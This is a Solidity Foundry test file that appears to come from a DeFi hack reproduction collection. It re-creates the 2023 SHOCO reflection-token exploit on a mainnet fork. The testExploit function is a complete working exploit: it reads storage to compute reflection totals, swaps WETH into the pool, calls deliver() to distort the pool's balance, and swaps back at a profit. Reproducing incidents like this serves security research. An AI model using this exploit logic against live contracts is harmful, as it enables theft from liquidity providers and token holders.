// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~4 ETH
// Original Attacker: https://etherscan.io/address/0x14d8ada7a0ba91f59dc0cb97c8f44f1d177c2195
// Frontrunner: https://etherscan.io/address/0xe71aca93c0e0721f8250d2d0e4f883aa1c020361
// Original Attack Contract: https://etherscan.io/address/0x15d684b4ecdc0ece8bc9aec6bce3398a9a4c7611
// Vulnerable Contract: https://etherscan.io/address/0x31a4f372aa891b46ba44dc64be1d8947c889e9c6
// Attack Tx: https://etherscan.io/tx/0x2e832f044b4a0a0b8d38166fe4d781ab330b05b9efa9e72a7a0895f1b984084b

// @Analysis
// https://github.com/Autosaida/DeFiHackAnalysis/blob/master/analysis/230119_SHOCO.md

interface IReflection is IERC20 {
    function deliver(uint256 amount) external;
    function tokenFromReflection(uint256 rAmount) external view returns(uint256);
}

contract SHOCOAttacker is Test {
    IUniswapV2Pair shoco_weth = IUniswapV2Pair(0x806b6C6819b1f62Ca4B66658b669f0A98e385D18);
    IReflection shoco = IReflection(0x31A4F372AA891B46bA44dC64Be1d8947c889E9c6);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
        vm.createSelectFork("mainnet");

        vm.label(address(shoco_weth), "shoco-weth UniswapPair");
        vm.label(address(weth), "WETH");
        vm.label(address(shoco), "SHOCO");
    }

    function getMappingValue(address targetContract, uint256 mapSlot, address key) public returns (uint256) {
        bytes32 slotValue = vm.load(targetContract, keccak256(abi.encode(key, mapSlot)));
        return uint256(slotValue);
    }
    
    // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) internal pure returns (uint amountOut) {
        require(amountIn > 0, 'UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint amountInWithFee = amountIn * 997;
        uint numerator = amountInWithFee * reserveOut;
        uint denominator = (reserveIn *1000) + amountInWithFee;
        amountOut = numerator / denominator;
    }

    // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) internal pure returns (uint amountIn) {
        require(amountOut > 0, 'UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT');
        require(reserveIn > 0 && reserveOut > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        uint numerator = reserveIn * amountOut * 1000;
        uint denominator = (reserveOut-amountOut) * 997;
        amountIn = (numerator / denominator) + 1;
    }

    function testExploit() external {
        uint attackBlockNumber = 16440978;
        vm.rollFork(attackBlockNumber);
        emit log_named_decimal_uint("WETH balance", weth.balanceOf(address(shoco_weth)), weth.decimals());
        deal(address(weth), address(this), 2000 ether);

        uint256 rTotal = uint256(vm.load(address(shoco), bytes32(uint256(14))));
        uint256 rExcluded = getMappingValue(address(shoco), 3, address(0xCb23667bb22D8c16e742d3Cce6CD01642bAaCc1a));
        uint256 rAmountOut = rTotal-rExcluded;
        uint256 shocoAmountOut = shoco.tokenFromReflection(rAmountOut) - 0.1*10**9;

        (uint reserve0, uint reserve1, ) = shoco_weth.getReserves();
        uint256 wethAmountIn = getAmountIn(shocoAmountOut, reserve1, reserve0);
        emit log_named_decimal_uint("WETH amountIn", wethAmountIn, weth.decimals());
        weth.transfer(address(shoco_weth), wethAmountIn);

        shoco_weth.swap(
            shocoAmountOut,
            0, 
            address(this),
            ""
        );

        shoco.deliver(shoco.balanceOf(address(this))*99999/100000);

        (reserve0, reserve1, ) = shoco_weth.getReserves();
        uint256 wethAmountOut = getAmountOut(shoco.balanceOf(address(shoco_weth))-reserve0, reserve0, reserve1);
        shoco_weth.swap(0, wethAmountOut, address(this), "");
        if (wethAmountIn < wethAmountOut) {
            emit log_named_decimal_uint("Attack profit:", wethAmountOut - wethAmountIn, weth.decimals());
        } else {
            emit log_named_decimal_uint("Attack loss:", wethAmountIn - wethAmountOut, weth.decimals());
        }
    }
    
}
